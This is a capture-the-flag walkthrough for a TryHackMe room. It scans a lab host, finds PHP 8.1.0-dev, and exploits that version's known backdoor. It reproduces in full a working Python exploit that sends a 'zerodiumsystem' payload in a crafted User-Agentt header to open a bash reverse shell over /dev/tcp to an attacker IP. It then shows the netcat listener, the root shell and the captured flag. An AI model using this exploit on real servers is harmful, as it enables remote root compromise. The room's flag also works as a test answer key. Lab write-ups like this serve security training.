---
Something seems a little off with the server.
---

![111](https://tryhackme-images.s3.amazonaws.com/room-icons/5dbc4e7d8515e7bc05b7742f26944ae9.png)
Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

After deploying the vulnerable machine attached to this task, please wait a couple of minutes for it to respond.

  
What is the flag?

Look closely at the HTTP headers when you request the first page...

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.215.93 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.215.93:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 13:16 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Initiating Ping Scan at 13:16
Scanning 10.10.215.93 [2 ports]
Completed Ping Scan at 13:16, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:16
Completed Parallel DNS resolution of 1 host. at 13:16, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:16
Scanning 10.10.215.93 [1 port]
Discovered open port 80/tcp on 10.10.215.93
Completed Connect Scan at 13:16, 0.26s elapsed (1 total ports)
Initiating Service scan at 13:16
Scanning 1 service on 10.10.215.93
Completed Service scan at 13:16, 7.62s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.215.93.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 7.69s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.79s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Nmap scan report for 10.10.215.93
Host is up, received syn-ack (0.20s latency).
Scanned at 2022-12-23 13:16:19 EST for 17s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack PHP cli server 5.5 or later (PHP 8.1.0-dev)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title:  Admin Dashboard

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.78 seconds

using burp

do intercept to it

HTTP headers are pieces of information that are sent along with an HTTP request or response. They provide additional context about the message being transmitted, such as the content type, the encoding used, the server's name, and so on.

For example, when a client (such as a web browser) sends an HTTP request to a server, it can include headers that specify the type of content being requested, the encoding used, the language preference, and other details. On the other hand, when a server responds to an HTTP request, it can include headers that specify the content type, the encoding used, the server's name, and other details.

Here are a few examples of common HTTP headers:

-   `Content-Type`: Specifies the MIME type of the request or response body. For example, `Content-Type: text/html` indicates that the body contains HTML content.
-   `Content-Encoding`: Specifies the encoding used for the request or response body. For example, `Content-Encoding: gzip` indicates that the body has been compressed using gzip.
-   `Server`: Specifies the name and version of the server that generated the response.
-   `User-Agent`: Specifies the client software that is making the request.

HTTP headers are an important part of the HTTP protocol and play a crucial role in how the web works. They allow clients and servers to communicate additional information about the request or response, and enable a wide range of functionality on the web.

find it

HTTP/1.1 200 OK

Host: 10.10.215.93

Date: Fri, 23 Dec 2022 18:26:44 GMT

Connection: close

X-Powered-By: PHP/8.1.0-dev

Content-type: text/html; charset=UTF-8

so let's found an exploit 

PHP version 8.1.0-dev github

https://github.com/flast101/php-8.1.0-dev-backdoor-rce


┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git
Cloning into 'php-8.1.0-dev-backdoor-rce'...
remote: Enumerating objects: 241, done.
remote: Counting objects: 100% (239/239), done.
remote: Compressing objects: 100% (113/113), done.
remote: Total 241 (delta 128), reused 232 (delta 124), pack-reused 2
Receiving objects: 100% (241/241), 1.66 MiB | 2.90 MiB/s, done.
Resolving deltas: 100% (128/128), done.
                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cd php-8.1.0-dev-backdoor-rce 
                                                                                                           
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ ls
backdoor_php_8.1.0-dev.py  docs  README.md  revshell_php_8.1.0-dev.py
                                                                                                           
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ cat revshell_php_8.1.0-dev.py 
# Exploit Title: PHP 8.1.0-dev Backdoor Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#     - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# CVE : N/A
# References:
#     - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#     - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.

Usage:
  python3 revshell_php_8.1.0-dev.py <target-ip> <attacker-ip> <attacker-port>
"""

#!/usr/bin/env python3
import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def reverse_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\"'
    injection = request.get(args.url, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)

def main(): 
    parser = argparse.ArgumentParser(description="Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>")
    parser.add_argument("url", metavar='<target URL>', help="Target URL")
    parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP",)
    parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
    args = parser.parse_args()
    if check_target(args):
        reverse_shell(args)
    else:
        print("Host is not available or vulnerable, aborting...")
        exit
    
if __name__ == "__main__":
    main()




This code appears to be a script that attempts to exploit a PHP 8.1.0-dev backdoor to gain a reverse shell on a target server. A reverse shell is a type of connection that allows an attacker to execute commands on the target server by connecting to the server from a remote machine.

The script begins by importing the necessary libraries and defining a few functions. The `check_target` function sends an HTTP request to the target URL and checks the response headers for the string "PHP/8.1.0-dev". If this string is found, the function returns `True`, indicating that the target may be vulnerable to the exploit.

The `reverse_shell` function then constructs a payload that, when executed, will create a reverse shell connection back to the attacker's machine. This payload is injected into the target server by sending an HTTP request with a special "User-Agent" header that contains the payload.

Finally, the `main` function parses command-line arguments and uses the `check_target` function to determine if the target is vulnerable. If it is, the `reverse_shell` function is called to try to gain a reverse shell on the target.

It's worth noting that this script is potentially malicious and should be used with caution. It is provided for informational purposes only.

revshell

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ python3 revshell_php_8.1.0-dev.py http://10.10.215.93 10.8.19.103 1337

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.215.93.
Ncat: Connection from 10.10.215.93:44620.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3f8655e43931:/var/www/html# whoami
whoami
root
root@3f8655e43931:/# find / -type f -name flag.txt 2>/dev/null
find / -type f -name flag.txt 2>/dev/null
/flag.txt
root@3f8655e43931:/# cat /flag.txt
cat /flag.txt
flag{4127d0530abf16d6d23973e3df8dbecb}

yep it works!!


```


*flag{4127d0530abf16d6d23973e3df8dbecb}*



[[Corridor]]